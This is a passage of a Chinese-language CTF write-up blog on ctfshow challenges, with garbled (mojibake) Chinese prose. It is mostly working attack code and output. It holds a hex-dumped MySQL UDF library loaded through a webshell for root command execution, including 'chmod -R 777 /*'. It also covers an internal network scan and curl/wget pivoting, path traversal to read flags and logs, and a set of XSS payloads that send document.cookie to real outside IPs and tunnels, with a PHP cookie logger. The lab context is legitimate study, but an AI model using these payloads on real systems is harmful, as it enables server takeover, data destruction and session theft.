46162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c2e64796e002e72656c2e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000b4000000b400000044010000030000000000000004000000040000000b000000f6ffff6f02000000f8010000f8010000c000000003000000000000000400000004000000150000000b00000002000000b8020000b8020000a0020000040000000100000004000000100000001d00000003000000020000005805000058050000f40100000000000000000000010000000000000025000000ffffff6f020000004c0700004c070000540000000300000000000000020000000200000032000000feffff6f02000000a0070000a00700004000000004000000010000000400000000000000410000000900000002000000e0070000e007000020010000030000000000000004000000080000004a0000000900000002000000000900000009000010000000030000000a0000000400000008000000530000000100000006000000100900001009000030000000000000000000000004000000000000004e000000010000000600000040090000400900003000000000000000000000000400000004000000590000000100000006000000700900007009000088040000000000000000000010000000000000005f0000000100000006000000f80d0000f80d00001c00000000000000000000000400000000000000650000000100000032000000140e0000140e0000dd000000000000000000000001000000010000006d0000000100000002000000f40e0000f40e00000400000000000000000000000400000000000000770000000100000003000000001000000010000008000000000000000000000004000000000000007e000000010000000300000008100000081000000800000000000000000000000400000000000000850000000100000003000000101000001010000004000000000000000000000004000000000000008a00000006000000030000001410000014100000d000000004000000000000000400000008000000930000000100000003000000e4100000e41000000c00000000000000000000000400000004000000980000000100000003000000f0100000f01000001400000000000000000000000400000004000000a1000000010000000300000004110000041100000400000000000000000000000400000000000000a7000000080000000300000008110000081100000800000000000000000000000400000000000000ac000000010000000000000000000000081100009b0000000000000000000000010000000000000001000000030000000000000000000000a3110000b500000000000000000000000100000000000000</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1=file_put_contents(&#x27;udf.txt&#x27;,hex2bin(&#x27;7F454C4602010100000000000000000003003E00&#x27;));</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹æ’ä»¶ä½ç½®</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &quot;%plugin%&quot;;</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹æ˜¯å¦èƒ½å¤Ÿå†™å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show global variables like &quot;secure%&quot;;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/05/29/ctfshow%E5%90%88%E9%9B%86-ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/QQ%E6%88%AA%E5%9B%BE20230530213014.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1=shell_exec(&#x27;cp udf.txt /usr/lib/mariadb/plugin/udf.so&#x27;);</span><br></pre></td></tr></table></figure>

<p>èšå‰‘æ‰§è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.so&#x27;;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/05/29/ctfshow%E5%90%88%E9%9B%86-ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/QQ%E6%88%AA%E5%9B%BE20230530204447.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select sys_eval(&#x27;sudo cat /root/you_win&#x27;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_654=ctfshow&#123;4ab2c2ccd0c3c35fdba418d8502f5da9&#125; </span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select sys_eval(&#x27;sudo chmod -R 777 /*&#x27;);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">key=key_is_here_you_know&amp;file=../db/data_you_never_know.db&amp;1=echo shell_exec(&quot;cat /F*/F*&quot;);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_647=ctfshow&#123;e6ad8304cdb562971999b476d8922219&#125;flag_648=ctfshow&#123;af5b5e411813eafd8dc2311df30b394e&#125;flag_649=ctfshow&#123;9ad80fcc305b58afbb3a0c2097ac40ef&#125;flag_650=ctfshow&#123;5eae22d9973a16a0d37c9854504b3029&#125;flag_651=ctfshow&#123;a4c64b86d754b3b132a138e3e0adcaa6&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line">$mysqli = new mysqli(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;ctfshow&quot;);</span><br><span class="line">$tmp = $mysqli-&gt;query($_POST[&#x27;sql&#x27;]);</span><br><span class="line">$result = $tmp-&gt;fetch_all();</span><br><span class="line">print_r($result);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<h2 id="å†…ç½‘æ¨ªå‘æ¸—é€"><a href="#å†…ç½‘æ¨ªå‘æ¸—é€" class="headerlink" title="å†…ç½‘æ¨ªå‘æ¸—é€"></a>å†…ç½‘æ¨ªå‘æ¸—é€</h2><p>ç”±äºshell å¸¦ä¸å‡ºæ¥ï¼Œdisable_functionä¹Ÿç»•ä¸è¿‡å»ï¼Œæ‰€ä»¥ï¼Œå°±è¿˜æ˜¯ç”¨shellæ‰“å§ï¼›èšå‰‘è¿æ¥è¿˜å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œè¿™ä¸ªå·®ä¸å¤šå¤Ÿäº†</p>
<p>æŸ¥çœ‹ç½‘æ®µcat &#x2F;etc&#x2F;hosts </p>
<p>172.2.132.4</p>
<p>cat &#x2F;etc&#x2F;hosts</p>
<p>scan.sh è¿è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">for ip in `seq 1 50`</span><br><span class="line">  do</span><br><span class="line">   &#123;</span><br><span class="line">  ping -c 1 172.2.132.$ip &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">    if [ $? -eq 0 ];then</span><br><span class="line">     echo 172.2.132.$ip UP</span><br><span class="line">    else</span><br><span class="line">     echo 172.2.132.$ip DOWN</span><br><span class="line">   fi</span><br><span class="line">&#125;&amp;</span><br><span class="line">done</span><br><span class="line">wait</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">172.2.132.1 UP</span><br><span class="line">172.2.132.4 UP</span><br><span class="line">172.2.132.2 UP</span><br><span class="line">172.2.132.3 UP</span><br><span class="line">172.2.132.7 UP</span><br><span class="line">172.2.132.5 UP</span><br><span class="line">172.2.132.6 UP</span><br></pre></td></tr></table></figure>

<p>ä¿¡æ¯æœé›†ä¸€ä¸‹ï¼Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1=echo shell_exec(&#x27;curl http://172.2.132.5/phpinfo.php&#x27;);</span><br></pre></td></tr></table></figure>

<p>disallowed &#x2F;public&#x2F;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1=echo shell_exec(&#x27;curl http://172.2.132.5/public/Readme.txt&#x27;);</span><br></pre></td></tr></table></figure>

<p>æ­å–œå¸ˆå‚…æ¥åˆ°ç¬¬äºŒå…³ï¼ ç¬¬äºŒå…³ç›¸æ¯”ç¬¬ä¸€å…³ï¼Œä¾æ—§æ˜¯æ²¡æœ‰éš¾åº¦ã€‚ glhf!                ctshow å¤§èœé¸¡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1=echo `wget http://172.2.132.5/www.zip`;</span><br></pre></td></tr></table></figure>

<p>ï¼Œç„¶åï¼Œè®¿é—®ä¸‹è½½ï¼Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;dbutil.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$a</span>)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;login&#x27;</span>:</span><br><span class="line">    	<span class="variable">$ret</span> = <span class="title function_ invoke__">login</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;index&#x27;</span>:</span><br><span class="line">    	<span class="variable">$ret</span> = <span class="title function_ invoke__">index</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;main&#x27;</span>:</span><br><span class="line">    	<span class="variable">$ret</span> = <span class="title function_ invoke__">main</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>]);</span><br><span class="line">    	<span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">         <span class="variable">$ret</span> = <span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;æ•°æ®è·å–å¤±è´¥&#x27;</span>,</span><br><span class="line">		));</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ret</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$html</span>=<span class="string">&#x27;ç®¡ç†å‘˜è¯·æ³¨æ„ï¼Œä¸‹é¢æ˜¯æœ€è¿‘ç™»é™†å¤±è´¥ç”¨æˆ·ï¼š&lt;br&gt;&#x27;</span>;</span><br><span class="line">    <span class="variable">$ret</span>=db::<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select username,login_time,login_ip from ctfshow_logs  order by id desc limit 3&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$ret</span> <span class="keyword">as</span> <span class="variable">$r</span>) &#123;</span><br><span class="line">    	<span class="variable">$html</span> .=<span class="string">&#x27;------------&lt;br&gt;ç”¨æˆ·å: &#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$r</span>[<span class="number">0</span>]).<span class="string">&#x27;&lt;br&gt;ç™»é™†å¤±è´¥æ—¶é—´: &#x27;</span></span><br><span class="line">    	.<span class="variable">$r</span>[<span class="number">1</span>]</span><br><span class="line">    	.<span class="string">&#x27;&lt;br&gt;ç™»é™†å¤±è´¥IP: &#x27;</span></span><br><span class="line">    	.<span class="variable">$r</span>[<span class="number">2</span>].</span><br><span class="line">    	<span class="string">&#x27;&lt;br&gt;------------&lt;br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$html</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">	<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">	<span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;æ•°æ®è·å–å¤±è´¥&#x27;</span>,</span><br><span class="line">	);</span><br><span class="line">	<span class="variable">$u</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$u</span>);</span><br><span class="line">	<span class="variable">$p</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$p</span>);</span><br><span class="line">	<span class="variable">$res</span> = db::<span class="title function_ invoke__">query</span>(<span class="string">&quot;select username from ctfshow_users where username = &#x27;<span class="subst">$u</span>&#x27; and password = &#x27;<span class="subst">$p</span>&#x27;&quot;</span>);</span><br><span class="line">	<span class="variable">$date</span> = <span class="keyword">new</span> <span class="title class_">DateTime</span>(<span class="string">&#x27;now&#x27;</span>);</span><br><span class="line">	<span class="variable">$now</span> = <span class="variable">$date</span>-&gt;<span class="title function_ invoke__">format</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>);</span><br><span class="line">	<span class="variable">$ip</span> = <span class="title function_ invoke__">addslashes</span>(<span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]));</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$res</span>)==<span class="number">0</span>)&#123;</span><br><span class="line"> 		 db::<span class="title function_ invoke__">insert</span>(<span class="string">&quot;insert into `ctfshow_logs` (`username`,`login_time`,`login_ip`) values (&#x27;<span class="subst">$u</span>&#x27;,&#x27;<span class="subst">$now</span>&#x27;,&#x27;<span class="subst">$ip</span>&#x27;)&quot;</span>);</span><br><span class="line">		 <span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;è´¦å·æˆ–å¯†ç é”™è¯¯&#x27;</span>;</span><br><span class="line">		 <span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">auth</span>())&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;AuthKey é”™è¯¯&#x27;</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;ç™»é™†æˆåŠŸ&#x27;</span>;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]=<span class="literal">true</span>;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;flag_660&#x27;</span>]=<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">auth</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$auth</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;auth&#x27;</span>]);</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$auth</span>==AUTH_KEY;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span>  FLAG_657;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">testFile</span>(<span class="params"><span class="variable">$f</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$file</span> = <span class="variable">$f</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">random_int</span>(<span class="number">1</span>,<span class="number">10000</span>)).<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">random_int</span>(<span class="number">1</span>,<span class="number">10000</span>))).<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">		<span class="variable">$result</span> = FLAG_658;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"><span class="variable">$m</span></span>)</span>&#123;</span><br><span class="line">	<span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">	<span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">	<span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;æ•°æ®è·å–å¤±è´¥&#x27;</span>,</span><br><span class="line">	);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]==<span class="literal">true</span>)&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">switch</span> (<span class="variable">$m</span>) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;getFlag&#x27;</span>:</span><br><span class="line">				<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="title function_ invoke__">getFlag</span>();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;testFile&#x27;</span>:</span><br><span class="line">				<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="title function_ invoke__">testFile</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="comment"># code...</span></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;è¯·å…ˆç™»é™†&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åæ¥ç¯å¢ƒé‡å¼€äº†ï¼Œç½‘æ®µæ”¹å˜äº†ï¼Œæ³¨æ„ä¸€ä¸‹</p>
<p>å­˜åœ¨ç›®å½•ç©¿è¶Šæ¼æ´</p>
<p><img src="/2023/05/29/ctfshow%E5%90%88%E9%9B%86-ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/QQ%E6%88%AA%E5%9B%BE20230601170949.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">key=key_is_here_you_know&amp;file=../db/data_you_never_know.db&amp;1=echo shell_exec(&#x27;curl http://172.2.132.5/public../FLAG/flag659.txt&#x27;);</span><br></pre></td></tr></table></figure>

<p>è®¿é—®æ—¥å¿—æ–‡ä»¶ï¼Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1=echo shell_exec(&#x27;curl http://172.2.238.5/public../var/log/nginx/</span><br><span class="line">ctfshow_web_access_log_file_you_never_know.log&#x27;);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?action=login&amp;u=admin&amp;p=nE7jA5m&amp;flag=flag_660_ctfshow&#123;23e56d95b430de80c7b5806f49a14a2b&#125;</span><br></pre></td></tr></table></figure>

<p>å‰©ä¸‹çš„å­¦ä¹ ä¸€ä¸‹ï¼Œå†å†™å§</p>
]]></content>
      <tags>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshowxss</title>
    <url>/2023/02/26/ctfshow%E5%90%88%E9%9B%86-xss/</url>
    <content><![CDATA[<p> xss</p>
<span id="more"></span>

<p>åå°„å‹XSSå¤§å¤šæ•°æ˜¯ç”¨æ¥ç›—å–ç”¨æˆ·çš„Cookieä¿¡æ¯ã€‚</p>
<h1 id="web316-326ï¼ˆåå°„å‹ï¼‰"><a href="#web316-326ï¼ˆåå°„å‹ï¼‰" class="headerlink" title="web316-326ï¼ˆåå°„å‹ï¼‰"></a>web316-326ï¼ˆåå°„å‹ï¼‰</h1><p>åœ¨æœ¬åœ°å»ºä¸€ä¸ªç½‘ç«™ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>, <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload:</p>
<p>21232f297a57a5a743894a0e4a801fc3</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;document.location.href=&#x27;http://101.43.182.125:7000/&#x27;+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<script type="text/javascript">window.location.href="http://node5.anna.nssctf.cn:28885/flag";</script>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;è‡ªå·±ç½‘ç«™ip?cookie=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>å³å¯åœ¨è‡ªå·±ç½‘ç«™ç”Ÿæˆä¸€ä¸ªcookie.txtæ–‡æ¡£å³æ˜¯flag</p>
<p>flag&#x3D;ctfshow{cbc17e98-ce5c-42a6-90f1-a2a5fb0bc724}</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;http://ä½ çš„å…¬ç½‘ip:ç«¯å£å·/&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="keyword">var</span> img = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;img&quot;</span>);img.<span class="property">src</span> = <span class="string">&quot;http://ä½ çš„å…¬ç½‘ip:ç«¯å£å·/?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://ä½ çš„å…¬ç½‘ip:ç«¯å£å·/&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">location.<span class="property">href</span>=<span class="string">&#x27;http://ä½ çš„å…¬ç½‘ip:ç«¯å£å·/&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&lt;input onfocus=&quot;window.open(&#x27;http://ä½ çš„å…¬ç½‘ip:ç«¯å£å·/&#x27;+document.cookie)&quot; autofocus&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg onload=&quot;window.open(&#x27;http://ä½ çš„å…¬ç½‘ip:ç«¯å£å·/&#x27;+document.cookie)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe onload=&quot;window.open(&#x27;http://ä½ çš„å…¬ç½‘ip:ç«¯å£å·/&#x27;+document.cookie)&quot;&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;body onload=&quot;window.open(&#x27;http://ä½ çš„å…¬ç½‘ip:ç«¯å£å·/&#x27;+document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="web320-326"><a href="#web320-326" class="headerlink" title="web320-326"></a>web320-326</h3><p>è¿‡æ»¤ç©ºæ ¼    &#x2F;**&#x2F;<br> payloadè¯­å¥</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;body/onload=<span class="string">&quot;window.location.href=&#x27;http://fe6e643.cpolar.top/2.php?c=&#x27;+document.cookie&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<h3 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;https://16d59916.cpolar.cn/test.php?cookie=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h2><p>æ¯ä¸€æ¬¡ç®¡ç†å‘˜çš„cookieä¼šæ”¹å˜ï¼Œæ‰€ä»¥æ— æ³•ä½¿ç”¨ä¸Šè¿°çš„æ–¹å¼å»è·å¾—cookie,,æ–¹æ³•æš‚æ— </p>
<p>ä¸€ã€å­˜å‚¨å‹XSSç®€ä»‹<br>ï¼ˆä¸€ï¼‰å­˜å‚¨å‹XSSçš„æ¦‚å¿µ<br>å­˜å‚¨å‹XSSåˆç§°æŒä¹…å‹XSSï¼Œæ”»å‡»è„šæœ¬å°†è¢«æ°¸ä¹…åœ°å­˜æ”¾åœ¨ç›®æ ‡æœåŠ¡å™¨çš„æ•°æ®åº“æˆ–æ–‡ä»¶ä¸­ï¼Œå…·æœ‰å¾ˆé«˜çš„éšè”½æ€§ã€‚åå°„å‹XSSçš„è¢«æ”»å‡»å¯¹è±¡ä¸€èˆ¬æ˜¯æ”»å‡»è€…å»å¯»æ‰¾çš„ï¼Œå°±æ¯”å¦‚è¯´ï¼šä¸€ä¸ªæ”»å‡»è€…æƒ³ç›—å–Açš„è´¦å·ï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥å°†ä¸€ä¸ªå«æœ‰åå°„å‹XSSçš„ç‰¹åˆ¶URLé“¾æ¥å‘é€ç»™Aï¼Œç„¶åç”¨èŠ±è¨€å·§è¯­è¯±éª—Aç‚¹å‡»é“¾æ¥ã€‚å½“Aä¸å°å¿ƒç‚¹è¿›å»æ—¶ï¼Œå°±ä¼šç«‹å³å—åˆ°XSSæ”»å‡»ã€‚è¿™ç§æ”»å‡»æ–¹å¼éœ€è¦ä¸€ç‚¹éª—æœ¯ï¼Œæ‰€ä»¥è¿™ç§æ”»å‡»èŒƒå›´ä¸æ˜¯ç‰¹åˆ«çš„å¹¿ï¼Œå¹¶ä¸”æäº¤æ¼æ´æ—¶è¦ä¹ˆå¹³å°ä¸è®¤ï¼Œè¦ä¹ˆä¼šè¢«è®¤å®šä¸ºä½å±æ¼æ´ã€‚<br>å­˜å‚¨å‹XSSå¯ä»¥é‡‡ç”¨å¹¿æ’’ç½‘çš„æ–¹å¼ï¼Œå°±æ˜¯æ”»å‡»è€…å°†å­˜å‚¨å‹XSSä»£ç å†™è¿›ä¸€äº›æœ‰XSSæ¼æ´çš„ç½‘ç«™ä¸Šï¼Œåªè¦æœ‰ç”¨æˆ·è®¿é—®è¿™ä¸ªé“¾æ¥å°±ä¼šè‡ªåŠ¨ä¸­æ‹›ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œå­˜å‚¨å‹XSSçš„å±å®³æ€§æ›´å¤§ï¼ŒèŒƒå›´æ›´å¹¿ï¼Œå¯ä»¥ä¸éœ€è¦å¯»æ‰¾è¢«æ”»å‡»å¯¹è±¡ï¼Œåªè¦å­˜å‚¨å‹XSSåœ¨æœåŠ¡å™¨ä¸Šå°±èƒ½å®æ–½æ”»å‡»ã€‚æ‰€ä»¥æäº¤çš„å­˜å‚¨å‹XSSè¯„çº§ä¸€èˆ¬ä¸ºä¸­å±æ¼æ´ã€‚</p>
